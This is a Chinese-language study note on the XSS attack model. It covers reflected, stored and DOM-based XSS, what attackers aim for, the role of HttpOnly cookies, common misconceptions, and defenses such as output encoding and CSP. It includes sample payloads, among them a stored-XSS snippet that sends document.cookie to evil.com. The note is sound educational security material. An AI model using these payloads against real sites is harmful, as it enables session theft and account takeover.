# XSS 攻击模型（Cross-Site Scripting）

## 📝 概要

XSS 是一种**攻击者将恶意 JavaScript 注入到可信站点中执行**的攻击方式，本质是：  
👉 **让浏览器“误以为攻击代码是本站代码”并执行它。**

---

## 📌 一句话结论
>
> **XSS = 攻击者借你的站点身份，执行他的 JS。**

---

## 🧠 XSS 的核心前提

XSS 能成立，必须同时满足：

1. 攻击者的代码能进入页面
2. 浏览器把它当成“可信脚本”执行
3. 执行环境是**受害者的登录态上下文**

---

## 🎯 XSS 能干什么？

在“未防护”的情况下，XSS 可以：

- 读取 `document.cookie`
- 窃取 localStorage / sessionStorage
- 发起任意 API 请求（带用户 Cookie）
- 监听键盘输入（密码）
- 劫持页面 UI
- 进行 CSRF / 钓鱼 / 账户接管

---

## 🧨 XSS 的三种主要攻击模型

---

### 1️⃣ 反射型 XSS（Reflected XSS）

#### 攻击模型

```text
攻击者 → 构造恶意 URL → 诱导用户点击 → 服务端原样返回 → 浏览器执行
````

#### 示例

```url
https://site.com/search?q=<script>alert(1)</script>
```

```html
<div>搜索结果：<script>alert(1)</script></div>
```

#### 特点

- 不存数据库

- 一次性

- 依赖用户点击链接

---

### 2️⃣ 存储型 XSS（Stored XSS）

#### 攻击模型

```text
攻击者 → 提交恶意内容 → 存数据库 → 普通用户访问 → 浏览器执行
```

#### 示例

```html
<script>
fetch('https://evil.com/steal?c=' + document.cookie)
</script>
```

存入：

- 评论

- 昵称

- 富文本内容

#### 特点

- 影响范围大

- 危害最高

- 不需要用户“主动点击”

---

### 3️⃣ DOM 型 XSS（DOM-based XSS）

#### 攻击模型

```text
攻击者 → 控制 URL / DOM 数据 → 前端 JS 拼接 → 执行
```

#### 示例

```js
const keyword = location.hash.slice(1)
document.body.innerHTML = keyword
```

```url
https://site.com/#<img src=x onerror=alert(1)>
```

#### 特点

- 与后端无关

- 发生在浏览器端

- 很容易被忽略

---

## 🧠 攻击者的“真实思路”

攻击者通常不是为了 `alert(1)`，而是为了：

```js
// 1. 窃取身份
document.cookie

// 2. 冒充用户操作
fetch('/api/transfer', { credentials: 'include' })

// 3. 持久控制
localStorage.setItem('backdoor', ...)
```

---

## 🔗 XSS 与 Cookie 的关系

### ❌ 未设置 HttpOnly

```js
document.cookie // 直接读取 session
```

➡️ 账户直接被接管

---

### ✅ 设置 HttpOnly

```http
Set-Cookie: session=xxx; HttpOnly
```

- JS 读不到 Cookie

- XSS 仍能发请求

- 但 **无法窃取会话**

👉 **XSS 危害被“降级”，而不是消失**

---

## ⚠️ 常见误区

### ❌ 前后端分离就没有 XSS

> 错

- DOM XSS 完全发生在前端

- React / Vue 也可能 XSS（`v-html` / `dangerouslySetInnerHTML`）

---

### ❌ 只要后端转义就安全

> 错

- 前端拼 DOM 一样会出事

- innerHTML 是高危 API

---

### ❌ XSS 只能偷 Cookie

> 错

- 还能发请求、监听输入、改页面、打 CSRF

---

## 🛡️ 防御 XSS 的核心策略（分层）

### 1️⃣ 输出编码（最重要）

- HTML escape

- Attribute escape

- JS context escape

---

### 2️⃣ 避免危险 API

❌

```js
innerHTML
document.write
eval
```

✅

```js
textContent
setAttribute
```

---

### 3️⃣ Cookie 防护

```http
HttpOnly
Secure
SameSite
```

---

### 4️⃣ CSP（Content-Security-Policy）

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self'
```

➡️ 就算 XSS 注入，也执行不了

---

## 🎯 适用场景

- Web 登录系统

- 管理后台

- 富文本输入

- 前端路由 / URL 参数

---

## 🔗 关联笔记

- [[HttpOnly Cookie]]

- [[CSRF 原理]]

- [[SameSite Cookie 详解]]

- [[Content Security Policy（CSP）详解]]

---

## 🏷️ 标签

- #security #xss #browser #cookie #frontend-security
